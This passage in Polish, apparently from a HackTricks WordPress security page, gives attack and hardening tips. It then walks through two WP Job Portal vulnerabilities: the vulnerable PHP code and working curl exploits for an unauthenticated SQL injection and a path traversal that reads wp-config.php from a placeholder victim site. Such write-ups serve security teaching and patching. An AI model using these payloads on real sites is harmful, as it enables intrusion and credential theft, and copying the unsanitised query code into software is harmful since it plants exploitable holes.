Uwagi ofensywne

- Celuj w punkty końcowe specyficzne dla wtyczek za pomocą czystych payloadów: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, niestandardowe handlery plików, shortcodes.
- Najpierw testuj ścieżki bez autoryzacji (AJAX `nopriv`, REST z pobłażliwym `permission_callback`, publiczne shortcodes). Domyślne payloady często działają bez obfuskacji.
- Typowe przypadki o dużym wpływie: eskalacja uprawnień (naruszona kontrola dostępu), dowolne przesyłanie/pobieranie plików, LFI, open redirect.

Uwagi defensywne

- Nie polegaj na ogólnych sygnaturach WAF, aby chronić CVE wtyczek. Wdróż virtual patches na warstwie aplikacji specyficzne dla danej podatności lub zaktualizuj szybko.
- Preferuj pozytywne mechanizmy bezpieczeństwa w kodzie (capabilities, nonces, rygorystyczna walidacja wejścia) zamiast negatywnych filtrów regex.

## Ochrona WordPress

### Regularne aktualizacje

Upewnij się, że WordPress, wtyczki i motywy są aktualne. Potwierdź także, że automatyczne aktualizacje są włączone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ponadto, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki bezpieczeństwa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- Usuń domyślnego użytkownika **admin**
- Używaj **silnych haseł** i **2FA**
- Okresowo **przeglądaj** **uprawnienia** użytkowników
- **Ogranicz liczbę prób logowania** aby zapobiec atakom Brute Force
- Zmień nazwę pliku **`wp-admin.php`** i zezwalaj na dostęp tylko wewnętrznie lub z określonych adresów IP.


### Nieuwierzytelniony SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal udostępniała zadanie **savecategory**, które ostatecznie wykonuje następujący podatny kod w `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Unsanitised user input** – `parentid` pochodzi bezpośrednio z żądania HTTP.
2. **String concatenation inside the WHERE clause** – brak `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – chociaż akcja jest wykonywana przez `admin-post.php`, jedyna kontrola to **CSRF nonce** (`wp_verify_nonce()`), który każdy odwiedzający może pobrać ze strony publicznej osadzającej shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Pobierz świeży nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknij dowolne SQL wykorzystując `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Odpowiedź ujawnia wynik wstrzykniętego zapytania lub modyfikuje bazę danych, co potwierdza SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Kolejne zadanie, **downloadcustomfile**, pozwalało odwiedzającym pobrać **dowolny plik na dysku** poprzez path traversal. Wrażliwy punkt znajduje się w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakującego i konkatenowany **bez sanitacji**.  Ponownie, jedyną przeszkodą jest **CSRF nonce**, który można pobrać ze strony z CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartość `wp-config.php`, leaking DB credentials and auth keys.

## Źródła

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
